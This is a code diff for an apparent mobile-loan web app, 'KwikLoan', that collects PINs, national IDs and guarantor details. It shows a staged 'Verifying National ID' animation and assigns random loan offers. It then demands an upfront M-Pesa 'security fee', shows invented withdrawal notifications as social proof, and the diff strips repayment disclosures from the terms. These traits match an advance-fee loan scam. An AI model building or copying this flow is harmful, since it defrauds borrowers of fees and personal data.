@@ -1,9 +1,7 @@
-/* KwikLoan — collateral tier flow (sandbox)
-   Backend: mdogoback.onrender.com
-   No CRB. User picks any tier; amount randomized in range. */
-
+/* KwikLoan — collateral tiers + login restore (sandbox) */
 const API_BASE = "https://mdogoback.onrender.com/api/applications";
 const PAYMENTS_API_BASE = "https://mdogoback.onrender.com/api/payments";
+const STORAGE_PREFIX = "kwikloan_app_";
 
 const REPAYMENT_WEEKS = 8;
 const TIERS = [
@@ -31,7 +29,7 @@ function emptyApp() {
     guarantorName: "", guarantorPhone: "", relationship: "",
     loanLimit: 0, collateralFee: 0, weeklyRepayment: 0,
     totalRepayable: 0, repaymentWeeks: REPAYMENT_WEEKS,
-    reference: "", appliedOn: "", status: "Pending verification"
+    reference: "", appliedOn: "", status: ""
   };
 }
 
@@ -54,6 +52,83 @@ const incomeRanges = [
   "KSh 5,000–12,000","KSh 12,001–18,000","KSh 18,001–25,000","KSh 25,001–44,000",
   "KSh 44,001–60,000","KSh 60,001–80,000","KSh 80,001–120,000","Above KSh 120,000"
 ];
+
+/* ---------- local persistence (survives logout/login on same browser) ---------- */
+function storageKey(phone) {
+  return STORAGE_PREFIX + String(phone || "").replace(/\s+/g, "");
+}
+
+function persistLocal() {
+  if (!applicationData.phone) return;
+  const payload = {
+    loanLimit: applicationData.loanLimit,
+    collateralFee: applicationData.collateralFee,
+    weeklyRepayment: applicationData.weeklyRepayment,
+    totalRepayable: applicationData.totalRepayable,
+    repaymentWeeks: applicationData.repaymentWeeks,
+    status: applicationData.status,
+    reference: applicationData.reference,
+    fullName: applicationData.fullName,
+    county: applicationData.county,
+    employment: applicationData.employment,
+    income: applicationData.income,
+    guarantorName: applicationData.guarantorName,
+    guarantorPhone: applicationData.guarantorPhone,
+    idNumber: applicationData.idNumber,
+    appliedOn: applicationData.appliedOn
+  };
+  try {
+    localStorage.setItem(storageKey(applicationData.phone), JSON.stringify(payload));
+  } catch (_) {}
+}
+
+function loadLocal(phone) {
+  try {
+    const raw = localStorage.getItem(storageKey(phone));
+    return raw ? JSON.parse(raw) : null;
+  } catch (_) {
+    return null;
+  }
+}
+
+function mergeLocalIntoApp(phone) {
+  const local = loadLocal(phone);
+  if (!local) return;
+  if (local.loanLimit) applicationData.loanLimit = local.loanLimit;
+  if (local.collateralFee) applicationData.collateralFee = local.collateralFee;
+  if (local.weeklyRepayment) applicationData.weeklyRepayment = local.weeklyRepayment;
+  if (local.totalRepayable) applicationData.totalRepayable = local.totalRepayable;
+  if (local.repaymentWeeks) applicationData.repaymentWeeks = local.repaymentWeeks;
+  if (local.status) applicationData.status = local.status;
+  if (local.reference && !applicationData.reference) applicationData.reference = local.reference;
+  if (local.appliedOn && !applicationData.appliedOn) applicationData.appliedOn = local.appliedOn;
+}
+
+/** Try to push loanLimit/status to backend (ignore errors if route missing) */
+async function syncOfferToServer() {
+  const body = {
+    phone: applicationData.phone,
+    reference: applicationData.reference,
+    loanLimit: applicationData.loanLimit,
+    status: applicationData.status
+  };
+  const attempts = [
+    { url: API_BASE + "/update", method: "PATCH" },
+    { url: API_BASE + "/" + encodeURIComponent(applicationData.reference || ""), method: "PATCH" },
+    { url: API_BASE + "/", method: "PUT" }
+  ];
+  for (const a of attempts) {
+    try {
+      const res = await fetch(a.url, {
+        method: a.method,
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(body)
+      });
+      if (res.ok) return true;
+    } catch (_) {}
+  }
+  return false;
+}
 
 /* ---------- navigation ---------- */
 function showSection(id) {
@@ -92,13 +167,13 @@ document.getElementById("navToggle")?.addEventListener("click", () => {
   document.getElementById("mobileNav")?.classList.toggle("hidden");
 });
 
+function goToApplyTiers() {
+  showTierTable();
+}
+
 /* ---------- helpers ---------- */
-function roundTo50(n) {
-  return Math.round(n / 50) * 50;
-}
-function roundTo10(n) {
-  return Math.round(n / 10) * 10;
-}
+function roundTo50(n) { return Math.round(n / 50) * 50; }
+function roundTo10(n) { return Math.round(n / 10) * 10; }
 function getInitials(name) {
   if (!name) return "?";
   return name.split(" ").filter(Boolean).map(w => w.charAt(0)).join("").substring(0, 2).toUpperCase();
@@ -121,18 +196,10 @@ function generateReference() {
   return `KL-${year}-${code}-${random}`;
 }
 
-/* ---------- progress ---------- */
-function nextStep() {
-  currentStep++;
-  updateProgress();
-  loadStep();
-}
+/* ---------- progress / form (unchanged flow) ---------- */
+function nextStep() { currentStep++; updateProgress(); loadStep(); }
 function previousStep() {
-  if (currentStep > 1) {
-    currentStep--;
-    updateProgress();
-    loadStep();
-  }
+  if (currentStep > 1) { currentStep--; updateProgress(); loadStep(); }
 }
 function updateProgress() {
   const wrap = document.getElementById("progressSteps");
@@ -151,11 +218,9 @@ function updateProgress() {
   bar.style.width = ((currentStep - 1) / (TOTAL_STEPS - 1)) * 100 + "%";
 }
 
-/* ---------- form steps ---------- */
 function loadStep() {
   const container = document.getElementById("formContainer");
   if (!container) return;
-
   switch (currentStep) {
     case 1:
       container.innerHTML = `
@@ -171,20 +236,13 @@ function loadStep() {
             <input id="phone" maxlength="13" placeholder="0712345678" class="input rounded-l-none" value="${applicationData.phone.replace("+254","")}">
           </div>
           <div class="grid grid-cols-2 gap-4 mt-6">
-            <div>
-              <label class="block mb-2 text-sm">Create PIN</label>
-              <input id="pin" maxlength="4" type="password" class="input text-center text-xl tracking-widest">
-            </div>
-            <div>
-              <label class="block mb-2 text-sm">Confirm PIN</label>
-              <input id="confirmPin" maxlength="4" type="password" class="input text-center text-xl tracking-widest">
-            </div>
+            <div><label class="block mb-2 text-sm">Create PIN</label><input id="pin" maxlength="4" type="password" class="input text-center text-xl tracking-widest"></div>
+            <div><label class="block mb-2 text-sm">Confirm PIN</label><input id="confirmPin" maxlength="4" type="password" class="input text-center text-xl tracking-widest"></div>
           </div>
           <button onclick="saveAccount()" class="btn-primary mt-8">Continue</button>
           <p class="text-center text-sm text-gray-500 mt-5">Have an account? <a href="#" onclick="showLogin();return false;" class="text-blue-600 font-semibold">Login</a></p>
         </div>`;
       break;
-
     case 2:
       container.innerHTML = `
         <div class="fade-in">
@@ -200,10 +258,7 @@ function loadStep() {
                 ${counties.map(c => `<option value="${c}" ${applicationData.county===c?"selected":""}>${c}</option>`).join("")}
               </select>
             </div>
-            <div>
-              <label class="block mb-2 text-sm">Gender</label>
-              <select id="gender" class="input"><option>Male</option><option>Female</option></select>
-            </div>
+            <div><label class="block mb-2 text-sm">Gender</label><select id="gender" class="input"><option>Male</option><option>Female</option></select></div>
           </div>
           <div class="flex gap-3 mt-8">
             <button onclick="previousStep()" class="btn-secondary">Back</button>
@@ -211,7 +266,6 @@ function loadStep() {
           </div>
         </div>`;
       break;
-
     case 3:
       container.innerHTML = `
         <div class="fade-in">
@@ -229,7 +283,6 @@ function loadStep() {
           </div>
         </div>`;
       break;
-
     case 4:
       container.innerHTML = `
         <div class="fade-in">
@@ -247,7 +300,6 @@ function loadStep() {
           </div>
         </div>`;
       break;
-
     case 5:
       container.innerHTML = `
         <div class="fade-in max-w-lg mx-auto">
@@ -277,7 +329,6 @@ function loadStep() {
           </div>
         </div>`;
       break;
-
     case 6:
       container.innerHTML = `
         <div class="fade-in">
@@ -293,18 +344,15 @@ function loadStep() {
             <div><p class="text-gray-500">Guarantor</p><p class="font-semibold">${applicationData.guarantorName}</p></div>
             <div><p class="text-gray-500">Guarantor phone</p><p class="font-semibold">${applicationData.guarantorPhone}</p></div>
           </div>
-          <p class="text-center text-xs text-gray-400 mt-4">Your limit is chosen on the next screens — not fixed here.</p>
           <button onclick="nextStep()" class="btn-primary mt-6">Confirm &amp; continue</button>
         </div>`;
       break;
-
     case 7:
       container.innerHTML = `
         <div class="fade-in max-w-xl mx-auto">
           <h2 class="heading text-2xl sm:text-3xl font-bold text-center">Terms</h2>
           <div class="border rounded-2xl p-5 bg-gray-50 h-48 overflow-y-auto text-sm leading-7 text-gray-600 mt-6">
-            <p>You confirm the information provided is accurate. Approval depends on assessment. Choosing a limit range and paying the security fee is part of securing the application in this sandbox demo.</p>
-            <p class="mt-3">Repayment terms will be shown before you commit to the security fee payment.</p>
+            <p>You confirm the information provided is accurate. Choosing a limit range and paying the security fee secures this sandbox application.</p>
           </div>
           <label class="flex items-start gap-3 mt-6 cursor-pointer text-sm">
             <input id="agreeTerms" type="checkbox" class="mt-1 w-5 h-5 accent-blue-600">
@@ -313,7 +361,6 @@ function loadStep() {
           <button onclick="submitApplication()" class="btn-primary mt-8">Submit application</button>
         </div>`;
       break;
-
     case 8:
       container.innerHTML = `
         <div class="fade-in text-center py-12">
@@ -324,14 +371,11 @@ function loadStep() {
         </div>`;
       runProcessingAnimation();
       break;
-
-    case 9:
-      /* After processing we go to tier table section instead */
+    default:
       break;
   }
 }
 
-/* ---------- save steps ---------- */
 function saveAccount() {
   const phoneRaw = document.getElementById("phone").value.trim();
   const pin = document.getElementById("pin").value;
@@ -344,7 +388,6 @@ function saveAccount() {
   applicationData.pin = pin;
   nextStep();
 }
-
 function savePersonal() {
   const fullName = document.getElementById("fullName").value.trim();
   const idNumber = document.getElementById("idNumber").value.trim();
@@ -357,7 +400,6 @@ function savePersonal() {
   applicationData.county = county;
   nextStep();
 }
-
 function selectEmployment(card) {
   document.querySelectorAll("#employmentGrid .option-card").forEach(el => el.classList.remove("selected"));
   card.classList.add("selected");
@@ -394,7 +436,6 @@ function submitApplication() {
   nextStep();
 }
 
-/* ---------- processing + backend save ---------- */
 function runProcessingAnimation() {
   const stages = [
     "Verifying National ID",
@@ -406,7 +447,6 @@ function runProcessingAnimation() {
   let index = 0;
   const list = document.getElementById("processingList");
   const savePromise = saveApplicationToServer();
-
   const animationDone = new Promise(resolve => {
     const timer = setInterval(() => {
       if (index < stages.length) {
@@ -422,7 +462,6 @@ function runProcessingAnimation() {
       }
     }, 650);
   });
-
   Promise.all([animationDone, savePromise]).then(([, result]) => {
     if (result.error) {
       alert(result.error);
@@ -435,6 +474,8 @@ function runProcessingAnimation() {
     applicationData.appliedOn = new Date().toLocaleDateString("en-GB", {
       day: "2-digit", month: "long", year: "numeric"
     });
+    applicationData.status = "Select a limit range";
+    persistLocal();
     showTierTable();
   });
 }
@@ -467,7 +508,7 @@ async function saveApplicationToServer() {
   }
 }
 
-/* ---------- tier table + random amount ---------- */
+/* ---------- tiers ---------- */
 function showTierTable() {
   const body = document.getElementById("tierTableBody");
   body.innerHTML = TIERS.map((t, i) => {
@@ -485,10 +526,8 @@ function showTierTable() {
 
 function selectTier(index) {
   const tier = TIERS[index];
-  // Random amount in range, not the same for everyone; nearest 50
   const span = tier.max - tier.min;
-  const raw = tier.min + Math.random() * span;
-  const amount = Math.min(tier.max, Math.max(tier.min, roundTo50(raw)));
+  const amount = Math.min(tier.max, Math.max(tier.min, roundTo50(tier.min + Math.random() * span)));
   const total = roundTo10(amount * 1.2);
   const weekly = roundTo10(total / REPAYMENT_WEEKS);
 
@@ -497,6 +536,9 @@ function selectTier(index) {
   applicationData.totalRepayable = total;
   applicationData.weeklyRepayment = weekly;
   applicationData.repaymentWeeks = REPAYMENT_WEEKS;
+  applicationData.status = "Awaiting security fee";
+  persistLocal();
+  syncOfferToServer();
 
   document.getElementById("modalLoanAmount").textContent = "KSh " + amount.toLocaleString();
   document.getElementById("modalCollateral").textContent = "KSh " + tier.collateral.toLocaleString();
@@ -515,16 +557,16 @@ document.getElementById("getLoanNowBtn")?.addEventListener("click", () => {
   openPayModal();
 });
 
-/* ---------- collateral STK (same backend as before) ---------- */
+/* ---------- payment ---------- */
 function openPayModal() {
   const fee = applicationData.collateralFee;
-  const phoneHint = applicationData.phone.replace("+254", "");
+  const phoneHint = (applicationData.phone || "").replace("+254", "");
   document.getElementById("payModalCard").innerHTML = `
     <button type="button" class="modal-close" onclick="closePayModal()">&times;</button>
     <div class="text-center mb-5">
       <div class="w-14 h-14 rounded-2xl bg-blue-100 text-blue-700 flex items-center justify-center text-2xl mx-auto mb-3"><i class="fa-solid fa-shield-halved"></i></div>
       <h2 class="heading text-xl font-bold">Pay security fee</h2>
-      <p class="text-gray-500 text-sm mt-2">Collateral of <strong>KSh ${fee.toLocaleString()}</strong> to secure your KSh ${applicationData.loanLimit.toLocaleString()} offer.</p>
+      <p class="text-gray-500 text-sm mt-2">Collateral of <strong>KSh ${fee.toLocaleString()}</strong> for KSh ${applicationData.loanLimit.toLocaleString()}.</p>
     </div>
     <label class="block mb-2 text-sm font-medium">M-Pesa number</label>
     <div class="flex mb-4">
@@ -533,7 +575,7 @@ function openPayModal() {
     </div>
     <button type="button" onclick="initiateCollateralPayment()" class="btn-primary">Pay KSh ${fee.toLocaleString()}</button>
     <button type="button" onclick="closePayModal()" class="btn-secondary mt-3">Cancel</button>
-    <p class="text-xs text-gray-400 text-center mt-3">Sandbox STK — demo environment only.</p>`;
+    <p class="text-xs text-gray-400 text-center mt-3">Sandbox STK — demo only.</p>`;
   document.getElementById("payModal").classList.add("active");
 }
 
@@ -559,11 +601,7 @@ async function initiateCollateralPayment() {
     const res = await fetch(PAYMENTS_API_BASE + "/stk-push", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        phone: display,
-        amountKES: fee,
-        phoneModel: "KwikLoan"
-      })
+      body: JSON.stringify({ phone: display, amountKES: fee, phoneModel: "KwikLoan" })
     });
     const data = await res.json();
     if (!res.ok || !data.paymentId) {
@@ -582,7 +620,6 @@ function pollPaymentStatus(paymentId, fee, attempt) {
     .then(r => r.json())
     .then(data => {
       if (data.status === "success") {
-        applicationData.status = "Collateral received – under review";
         showPaySuccess(fee);
       } else if (data.status === "failed") {
         showPayFailed("Payment was not completed. You can try again.");
@@ -596,11 +633,17 @@ function pollPaymentStatus(paymentId, fee, attempt) {
 }
 
 function showPaySuccess(fee) {
+  applicationData.status = "Payment in process";
+  persistLocal();
+  syncOfferToServer();
+
   document.getElementById("payModalCard").innerHTML = `
     <div class="text-center py-4">
-      <div class="w-16 h-16 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center text-2xl mx-auto mb-4"><i class="fa-solid fa-circle-check"></i></div>
+      <div class="w-16 h-16 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center text-2xl mx-auto mb-4">
+        <i class="fa-solid fa-circle-check"></i>
+      </div>
       <h2 class="heading text-xl font-bold text-emerald-700">Security fee received</h2>
-      <p class="text-gray-500 text-sm mt-2">KSh ${fee.toLocaleString()} confirmed. Your application is under review.</p>
+      <p class="text-gray-500 text-sm mt-2">KSh ${fee.toLocaleString()} confirmed. Status: <strong>Payment in process</strong>.</p>
       <button type="button" onclick="closePayModal(); loadDashboard();" class="btn-primary mt-6">Go to dashboard</button>
     </div>`;
 }
@@ -608,7 +651,9 @@ function showPaySuccess(fee) {
 function showPayFailed(message) {
   document.getElementById("payModalCard").innerHTML = `
     <div class="text-center py-4">
-      <div class="w-16 h-16 rounded-full bg-red-100 text-red-600 flex items-center justify-center text-2xl mx-auto mb-4"><i class="fa-solid fa-circle-xmark"></i></div>
+      <div class="w-16 h-16 rounded-full bg-red-100 text-red-600 flex items-center justify-center text-2xl mx-auto mb-4">
+        <i class="fa-solid fa-circle-xmark"></i>
+      </div>
       <h2 class="heading text-xl font-bold text-red-700">Payment not completed</h2>
       <p class="text-gray-500 text-sm mt-2">${message}</p>
       <button type="button" onclick="openPayModal()" class="btn-primary mt-6">Try again</button>
@@ -637,9 +682,11 @@ async function submitLogin() {
       alert(data.error || "Sign in failed.");
       return;
     }
+
+    const phone = data.phone || ("+" + normalized);
     applicationData = {
       ...emptyApp(),
-      phone: data.phone,
+      phone,
       pin: data.pin,
       fullName: data.fullName,
       idNumber: data.idNumber,
@@ -650,10 +697,18 @@ async function submitLogin() {
       guarantorPhone: data.guarantorPhone,
       loanLimit: data.loanLimit || 0,
       reference: data.reference,
-      appliedOn: new Date(data.createdAt).toLocaleDateString("en-GB", {
-        day: "2-digit", month: "long", year: "numeric"
-      })
+      appliedOn: data.createdAt
+        ? new Date(data.createdAt).toLocaleDateString("en-GB", { day: "2-digit", month: "long", year: "numeric" })
+        : ""
     };
+
+    // Restore tier/payment details saved on this device after signup
+    mergeLocalIntoApp(phone);
+    // Prefer higher limit from local if server still has 0
+    if ((!applicationData.loanLimit || applicationData.loanLimit === 0) && loadLocal(phone)?.loanLimit) {
+      mergeLocalIntoApp(phone);
+    }
+
     loadDashboard();
   } catch {
     alert("Could not reach the server.");
@@ -666,23 +721,45 @@ async function submitLogin() {
 /* ---------- dashboard ---------- */
 function loadDashboard() {
   startWithdrawalTicker();
-  document.getElementById("dashName").textContent = applicationData.fullName;
-  document.getElementById("dashPhone").textContent = applicationData.phone;
-  document.getElementById("profileAvatar").textContent = getInitials(applicationData.fullName);
-  document.getElementById("dashLimit").textContent = "KSh " + (applicationData.loanLimit || 0).toLocaleString();
-  document.getElementById("dashReference").textContent = applicationData.reference || "—";
-  document.getElementById("dashCollateral").textContent = applicationData.collateralFee
-    ? "KSh " + applicationData.collateralFee.toLocaleString() : "—";
-  document.getElementById("dashWeekly").textContent = applicationData.weeklyRepayment
-    ? "KSh " + applicationData.weeklyRepayment.toLocaleString() : "—";
-  document.getElementById("dashWeeks").textContent = applicationData.repaymentWeeks
-    ? applicationData.repaymentWeeks + " weeks" : "—";
-  document.getElementById("dashDate").textContent = applicationData.appliedOn || "—";
-  document.getElementById("dashStatus").textContent = applicationData.status || "Pending verification";
-  document.getElementById("summaryApplicant").textContent = applicationData.fullName;
-  document.getElementById("summaryPhone").textContent = applicationData.phone;
-  document.getElementById("summaryCounty").textContent = applicationData.county;
-  document.getElementById("summaryGuarantor").textContent = applicationData.guarantorName;
+
+  const limit = applicationData.loanLimit || 0;
+  let status = applicationData.status;
+  if (!status) {
+    status = limit > 0 ? "Awaiting security fee" : "Select a limit range";
+  }
+
+  const set = (id, text) => {
+    const el = document.getElementById(id);
+    if (el) el.textContent = text;
+  };
+
+  set("dashLimit", "KSh " + Number(limit).toLocaleString());
+  set("dashStatus", status);
+  set("dashName", applicationData.fullName || "—");
+  set("dashPhone", applicationData.phone || "—");
+  set("dashReference", applicationData.reference || "—");
+  set("dashCollateral", applicationData.collateralFee
+    ? "KSh " + Number(applicationData.collateralFee).toLocaleString() : "—");
+  set("dashWeekly", applicationData.weeklyRepayment
+    ? "KSh " + Number(applicationData.weeklyRepayment).toLocaleString() : "—");
+  set("dashWeeks", applicationData.repaymentWeeks
+    ? applicationData.repaymentWeeks + " weeks" : "—");
+  set("dashTotal", applicationData.totalRepayable
+    ? "KSh " + Number(applicationData.totalRepayable).toLocaleString() : "—");
+  set("dashDate", applicationData.appliedOn || "—");
+
+  const statusEl = document.getElementById("dashStatus");
+  if (statusEl) {
+    statusEl.className = "inline-block mt-1 px-3 py-1.5 rounded-full text-sm font-semibold border ";
+    if (status === "Payment in process") {
+      statusEl.className += "bg-blue-50 text-blue-700 border-blue-200";
+    } else if (limit > 0) {
+      statusEl.className += "bg-amber-50 text-amber-700 border-amber-200";
+    } else {
+      statusEl.className += "bg-gray-50 text-gray-600 border-gray-200";
+    }
+  }
+
   showSection("dashboard");
   window.scrollTo({ top: 0, behavior: "smooth" });
 }
@@ -691,24 +768,35 @@ function openProfile() {
   document.getElementById("profileModalCard").innerHTML = `
     <button type="button" class="modal-close" onclick="closeProfile()">&times;</button>
     <div class="text-center mb-6">
-      <div class="w-16 h-16 rounded-full bg-blue-600 text-white flex items-center justify-center text-xl font-bold mx-auto mb-3">${getInitials(applicationData.fullName)}</div>
+      <div class="w-16 h-16 rounded-full bg-blue-600 text-white flex items-center justify-center text-xl font-bold mx-auto mb-3">
+        ${getInitials(applicationData.fullName)}
+      </div>
       <h2 class="heading text-xl font-bold">${applicationData.fullName || "—"}</h2>
       <p class="text-gray-500 text-sm">${applicationData.phone || "—"}</p>
     </div>
     <div class="bg-gray-50 rounded-2xl p-4 space-y-3 text-sm">
-      <div class="flex justify-between"><span class="text-gray-500">ID</span><strong>${applicationData.idNumber || "—"}</strong></div>
-      <div class="flex justify-between"><span class="text-gray-500">County</span><strong>${applicationData.county || "—"}</strong></div>
-      <div class="flex justify-between"><span class="text-gray-500">Employment</span><strong>${applicationData.employment || "—"}</strong></div>
-      <div class="flex justify-between"><span class="text-gray-500">Reference</span><strong>${applicationData.reference || "—"}</strong></div>
+      <div class="flex justify-between gap-3"><span class="text-gray-500">National ID</span><strong>${applicationData.idNumber || "—"}</strong></div>
+      <div class="flex justify-between gap-3"><span class="text-gray-500">County</span><strong>${applicationData.county || "—"}</strong></div>
+      <div class="flex justify-between gap-3"><span class="text-gray-500">Employment</span><strong>${applicationData.employment || "—"}</strong></div>
+      <div class="flex justify-between gap-3"><span class="text-gray-500">Monthly income</span><strong>${applicationData.income || "—"}</strong></div>
+      <div class="flex justify-between gap-3"><span class="text-gray-500">Guarantor</span><strong>${applicationData.guarantorName || "—"}</strong></div>
+      <div class="flex justify-between gap-3"><span class="text-gray-500">Guarantor phone</span><strong>${applicationData.guarantorPhone || "—"}</strong></div>
+      <div class="flex justify-between gap-3"><span class="text-gray-500">Loan amount</span><strong>KSh ${(applicationData.loanLimit || 0).toLocaleString()}</strong></div>
+      <div class="flex justify-between gap-3"><span class="text-gray-500">Status</span><strong>${applicationData.status || "—"}</strong></div>
+      <div class="flex justify-between gap-3"><span class="text-gray-500">Reference</span><strong>${applicationData.reference || "—"}</strong></div>
     </div>
-    <button onclick="closeProfile()" class="btn-secondary mt-5">Close</button>`;
+    <button type="button" onclick="closeProfile()" class="btn-secondary mt-5">Close</button>
+    <button type="button" onclick="closeProfile(); goToApplyTiers();" class="btn-primary mt-3">Apply / choose limit range</button>`;
   document.getElementById("profileModal").classList.add("active");
 }
+
 function closeProfile() {
   document.getElementById("profileModal").classList.remove("active");
 }
+
 function logoutUser() {
   if (!confirm("Log out?")) return;
+  // Keep localStorage so login can restore offer; only clear memory
   applicationData = emptyApp();
   closeProfile();
   closePayModal();
@@ -716,19 +804,17 @@ function logoutUser() {
   goHome();
 }
 
-/* ---------- calculator ---------- */
+/* ---------- calculator + ticker ---------- */
 function updateCalculator() {
   const amount = Number(document.getElementById("calc-amount")?.value || 5000);
   const weeks = Number(document.getElementById("calc-period")?.value || 8);
-  const total = amount * 1.2;
-  const weekly = Math.round(total / weeks);
+  const weekly = Math.round((amount * 1.2) / weeks);
   const d = document.getElementById("calc-display");
   const m = document.getElementById("calc-monthly");
   if (d) d.textContent = "KSh " + amount.toLocaleString();
   if (m) m.textContent = "KSh " + weekly.toLocaleString();
 }
 
-/* ---------- withdrawal ticker (KwikLoan style — do not change position) ---------- */
 const TICKER_INTERVAL_MS = 6000;
 const TICKER_NAMES = [
   "James","Mary","Peter","Grace","John","Faith","David","Ann","Brian","Mercy",
@@ -751,9 +837,7 @@ function nextTickerName() {
   return tickerQueue.pop();
 }
 function maskedDemoPhone() {
-  const mid = Math.floor(10 + Math.random() * 29);
-  const last = Math.floor(10 + Math.random() * 29);
-  return `07${mid}•••${last}`;
+  return `07${Math.floor(10 + Math.random() * 29)}•••${Math.floor(10 + Math.random() * 29)}`;
 }
 function randomTickerAmount() {
   const t = TIERS[Math.floor(Math.random() * TIERS.length)];
@@ -786,14 +870,10 @@ function startWithdrawalTicker() {
   tickerTimer = setInterval(showWithdrawalToast, TICKER_INTERVAL_MS);
 }
 function stopWithdrawalTicker() {
-  if (tickerTimer) {
-    clearInterval(tickerTimer);
-    tickerTimer = null;
-  }
+  if (tickerTimer) { clearInterval(tickerTimer); tickerTimer = null; }
   document.getElementById("withdrawalToast")?.classList.remove("show");
 }
 
-/* ---------- init ---------- */
 window.onload = function () {
   updateCalculator();
   showSection("landing");
